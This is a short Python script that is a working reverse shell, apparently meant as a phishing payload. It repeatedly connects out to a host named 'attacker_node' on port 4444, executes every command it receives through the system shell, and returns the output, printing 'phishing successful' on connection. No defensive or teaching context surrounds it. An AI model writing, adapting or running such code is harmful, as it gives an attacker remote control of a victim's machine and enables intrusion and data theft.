import socket
import subprocess
import time


def create_connection(target, port=4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    print("phishing successful")
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


if __name__ == '__main__':
    while True:
        time.sleep(5)
        try:
            create_connection("attacker_node")
        except ConnectionError:
            pass
